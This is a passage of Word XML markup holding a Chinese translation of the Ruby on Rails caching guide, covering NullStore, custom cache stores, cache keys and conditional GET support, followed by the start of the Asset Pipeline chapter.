        <w:t xml:space="preserve"> 。 更多关于 Ehcache for JRuby and Rails 的信息，请查看 </w:t>
      </w:r>
      <w:hyperlink r:id="rId931" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://ehcache.org/documentation/jruby.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7342D235"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2.7 ActiveSupport::Cache::NullStore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65872B1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该缓存存储的实现不存储任何内容，它应该只是用于开发或测试环境下。在开发环境下这是非常有用的，如果你有代码和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.cache</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 交互，但是缓存可以直接看到代码更改的结果。使用该缓存存储方式，所有的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fetch</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>read</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 操作将会丢失。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5760"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="213F5072" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D8E2572" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="507906953"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ActionController::Base.cache_store = :null_store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="14FDEA93"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2.8 自定义的缓存存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1CD5F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可以通过扩展 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveSupport::Cache::Store</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，以及实现相应的方法来创建自定义缓存存储。通过这种方式，可以将任何缓存技术应用到你的 Rails 应用程序中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2949CA1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使用一个自定义的缓存存储，只需要简单的将缓存设置为该类的一个实例。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="709F87CA" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EDA87FC" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="611519155"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ActionController::Base.cache_store = MyCacheStore.new</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="332947E5"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2.9 Cache Keys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B7EB3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在缓存中使用的键可以是任何能对 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cache_key</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:to_param</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 响应的对象。如果需要生成自定义的键，可以在类里面实现 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cache_key</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法。Active Record 会生成基于类名和纪录 id 的键。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C8753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你可以使用 Hash 和 数组的值作为缓存键。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7920"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="26083E19" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="004510E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This is a legal cache key</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74A62C8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Rails.cache.read(:site</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "mysite", :owners</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; [owner_1, owner_2])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2543065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你在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.cache</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中使用的键和这些在实际中使用的存储引擎中使用的键不一样。他们可能会修改一个命名空间或改变以适应技术的后端约束。这意味着，例如，你不能使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.cache</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 保存值，然后尝试使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>memcache-client</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem 来获取值。然而，你也不需要担心超出 memcached 限制的大小和违反语法规则。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17573FD4"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3 有条件的 GET 支持</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0938640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有条件的 GET 是 HTTP 规格的一个特性，它为 web 服务提供一种方式来告知浏览器对一个 GET 请求的响应与上一个的请求没有变化，可以安全的从浏览器缓存中获取。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536273B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通过使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>HTTP_IF_NONE_MATCH</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>HTTP_IF_MODIFIED_SINCE</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 头部来传递返回唯一的内容标识和内容上次更改的时间戳。如果浏览器发起一个请求，它的内容标识（etag）或者上次更改的时间戳匹配服务器的版本，之后服务器只需要发送会一个包含未更改状态的空响应。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02FD905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查看上次更改的时间戳和 if-none-match 头部以及决定是否发送整个响应 是服务器（例如我们）的负责的。在 Rails 中使用 conditional-get 支持是非常简单的：</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68E47542" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54972C2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ProductsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46869AA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34E712F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show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FD0617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@product</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Product.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18378E6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265F21D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If the request is stale according to the given timestamp and etag value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AA325A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(i.e. it needs to be processed again) then execute this block</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FE94A7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if</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>stale?(:last_modified</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @product.updated_at.utc, :etag</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43DBAC2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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|wants|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D68089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 normal response processing</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B1F74E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00D5BF0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230D5C9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52A69EF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If the request is fresh (i.e. it's not modified) then you don't need to do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D2C79D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anything. The default render checks for this using the parameters</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E4A75F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used in the previous call to stale? and will automatically send a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="599C1DD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:not_modified. So that's it, you're done.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5531487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5EB535F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1F73631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If you don’t have any special response processing and are using the default rendering mechanism (i.e. you’re not using respond_to or calling render yourself) then you’ve got an easy helper in fresh_when:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28ACEB0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如果你没有任何特殊的响应过程，且使用默认的渲染机制（例如：没有使用 respond_to 或者自己调用渲染），则你可以使用简单的fresh_when 这个helper方法：</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16620128" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0CC05F0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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ProductsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B0B5FD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0E67DCE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This will automatically send back a :not_modified if the request is fresh,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4193173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and will render the default template (product.*) if it's stale.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42EE456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49E9C25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show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27D1140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@product</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Product.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AF9AED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fresh_when :last_modified</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @product.published_at.utc, :etag</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @product</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77B4B88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6B18181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48D30F4E"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4 更多阅读</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FF10E1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="257"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId932" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Scaling Rails Screencasts</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B377702" w14:textId="6A64A85C" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.11、</w:t>
      </w:r>
      <w:hyperlink r:id="rId933" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Asset Pipeline</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="29DD577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这个指南涵盖了在 Rails 3.1 引进的 asset pipling. 通过浏览这个指南，你将能：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B70BACF" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="244"/>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理解 asset pipline 是什么和它是做什么的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBB5D7C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="244"/>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合理的组织应用程序的资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FE2010" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="244"/>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了解 asset pipline 的优点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7420BA42" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="244"/>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为 pipeline 添加预处理器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26967BE0" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="244"/>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用一个 gem 打包资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761B0AA0"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目录</w:t>
      </w:r>
